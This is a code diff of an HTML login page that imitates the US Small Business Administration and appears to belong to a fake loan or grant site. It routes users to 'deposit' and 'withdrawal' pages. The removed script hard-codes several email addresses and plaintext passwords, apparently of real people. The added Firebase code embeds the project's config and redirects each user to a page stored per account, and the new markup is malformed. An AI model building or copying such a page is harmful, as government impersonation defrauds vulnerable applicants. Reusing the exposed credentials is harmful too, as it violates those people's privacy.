@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="en" dir="ltr" prefix="og: https://ogp.me/ns#">
 <head>
@@ -49,14 +50,14 @@
     .login-form input[type="password"] {
       width: 100%;
       padding: 10px;
-      margin-bottom: 10px;
+      margin-bottom: 30px;
       border: 1px solid #ccc;
-      border-radius: 5px;
+      border-radius: 25px;
       box-sizing: border-box;
     }
     .login-form button {
       width: 100%;
-      padding: 10px;
+      padding: 20px;
       background-color: #15317E;
       color: #fff;
       border: none;
@@ -77,36 +78,6 @@
       color: #15317E;
     }
   </style>
-<script>
-  function login() {
-    var username = document.getElementById("username").value.trim();
-    var password = document.getElementById("password").value.trim();
-
-    if (username === "Lnichols03@yahoo.com" && password === "Lnichols572") {
-      setTimeout(function() {
-        window.location.href = "deposit.html";
-      }, 3000); // 3-second delay
-
-    } else if (username === "lakeshialee818@icloud.com" && password === "LaKeshia@#294") {
-      setTimeout(function() {
-        window.location.href = "https://sba-loan-application-and-approval-p.vercel.app/withdrawer.html";
-      }, 3000);
-
-    } else if (username === "you2" && password === "me") {
-      setTimeout(function() {
-        window.location.href = "approve.html";
-      }, 3000);
-
-    } else if (username === "soniajt50buisness@gmail.com" && password === "SoniaJT@#5") {
-      setTimeout(function() {
-        window.location.href = "withdrawal-c.html";
-      }, 3000);
-
-    } else {
-      alert("You haven't signed up for the ongoing SBA Grant, nor is your business listed in the USA business directory.");
-    }
-  }
-</script>
 
 </head>
 <body>
@@ -2394,18 +2365,66 @@
 </header>
 
   <main>
-    <h1>SBA BUSINESS LOAN APPROVAL</h1>
+    <h1>SBA LOAN</h1>
     <div>
-      <p>SBA provides limited small business loans and loans to states and eligible community organizations to promote entrepreneurship.</p>
+      <p>SBA provides limited small business loan and loans to states and eligible community organizations to promote entrepreneurship.</p>
       <p>Please utilize the username and password generated during registration to monitor the progress of your loan.</p>
     </div>
-    <div class="login-form">
-      <h2>Login</h2>
-      <input type="text" id="username" placeholder="Username" required>
-      <input type="password" id="password" placeholder="Password" required>
-      <button onclick="login()">Login</button>
-    </div>
-  </main>
+  <title>Login with Optional Admin Redirect</title>
+  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-auth-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
+</head>
+<body>
+
+  <input placeholder="Email" id="email" /><br />
+  <input placeholder="Password" type="password" id="password" /><br /><br />
+
+
+  <button onclick="login()">Login</button>
+
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyBK5UM0n8-GLvleW7l6B8Hi-_WuC64QA4U",
+      authDomain: "scores-b25a7.firebaseapp.com",
+      databaseURL: "https://scores-b25a7-default-rtdb.firebaseio.com",
+      projectId: "scores-b25a7",
+      storageBucket: "scores-b25a7.appspot.com",
+      messagingSenderId: "1001957936318",
+      appId: "1:1001957936318:web:90fdfb367f82f6a3d8e2ef"
+    };
+
+    firebase.initializeApp(firebaseConfig);
+
+    function login() {
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+
+      firebase.auth().signInWithEmailAndPassword(email, password)
+        .then((userCredential) => {
+          const user = userCredential.user;
+          const uid = user.uid;
+
+          firebase.database().ref("userRedirects/" + uid).once("value")
+            .then(snapshot => {
+              if (snapshot.exists()) {
+                const redirectPage = snapshot.val();
+                window.location.href = redirectPage;
+              } else {
+                // Default fallback
+                window.location.href = "dashboard.html";
+              }
+            })
+            .catch(() => {
+              // If any error occurs while checking the redirect, also fallback
+              window.location.href = "dashboard.html";
+            });
+        })
+        .catch((error) => {
+          alert("Login failed: " + error.message);
+        });
+    }
+  </script>
 <footer class="usa-footer usa-footer--big ">
   <div class="grid-container usa-footer__return-to-top">
     <a href="#">Return to top</a>
